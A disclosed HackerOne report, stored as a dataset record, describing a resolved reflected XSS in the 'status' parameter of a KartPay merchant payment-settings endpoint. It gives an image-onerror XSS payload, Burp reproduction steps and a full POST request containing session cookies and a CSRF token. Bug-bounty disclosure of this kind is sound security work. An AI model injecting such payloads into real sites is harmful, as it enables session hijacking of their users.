---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '643537'
original_report_id: '643537'
title: Reflected XSS on https://merchant.kartpay.com/payment_settings [status]
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: kartpay
created_at: '2019-07-15T13:08:54.755Z'
disclosed_at: '2019-08-28T15:27:54.390Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
asset_identifier: '*.kartpay.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on https://merchant.kartpay.com/payment_settings [status]

## Metadata

- HackerOne Report ID: 643537
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: kartpay
- Disclosed At: 2019-08-28T15:27:54.390Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

#Vulnerable URL
https://merchant.kartpay.com/payment_settings/type

#Parameter
``status``

#Payload
```"><img src=x onerror=alert(domain)>```

#Steps to Reproduce
1. Login with your credentials.
2. Go to https://merchant.kartpay.com/payment_settings
3. Start Burp suite proxy and intercept on.
4. Click on Run and Save button. intercept the request.
5. Enter above payload in vulnerable parameter.
6. Right click Show response in browser. 
7. You will notice that xss will execute. 

#POST Request

```
POST /payment_settings/type HTTP/1.1
Host: merchant.kartpay.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://merchant.kartpay.com/payment_settings
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CSRF-TOKEN: XGf5lqENEGvobu7MFdK2LfgtUoYZ2Hl6JWwYMLOV
X-Requested-With: XMLHttpRequest
Content-Length: 73
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6IkIyMkNoakFhYVVpdmFtalJUc3JZWlE9PSIsInZhbHVlIjoiYTg1TlZFeUZLNzUxaVJoOXZyV1gxSWhZaEh5eTRuWENMRXJLR05tZGZMUVRUQ2ozTWgwbG1IMUlFZ0JxcVk5ZyIsIm1hYyI6IjNhZTI4ODM0YWY3YzM5N2JhZDEzMGE1NjdiODZhZWU4ZWM4YjI1ZjhjYmJhMWNhZGFlYTdkMmQ4OTRhMmRmNDcifQ%3D%3D; laravel_session=eyJpdiI6IlZuRkhIWmMxbFU2ZFArR3lVc1hFM1E9PSIsInZhbHVlIjoiXC9KSFZhVlV4YWpSNWR2YjlFS1F0STF5QTVYMTh3Y1ZNN1hWY2RhZnAxRFArXC9KT2FmUG01UldVR3dYTHdYWE03IiwibWFjIjoiOWMyYzJlY2MwYjY2NDkyMTkxZDhlOGE4Njk0N2QwYTdkNjFkMjRlZWNlNDBjNTc3MmZiYjg5YTI1Yjc4NTkxNiJ9; _ga=GA1.2.1275163119.1563193948; _gid=GA1.2.1455926951.1563193948

merchant_id=729&type_id=5&status=false"><img src=x onerror=alert(cookie)>
```
{F529602}
{F529603}
{F529604}
{F529605}

## Impact

with the help of this attack, an attacker can execute malicious javascript on an application

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
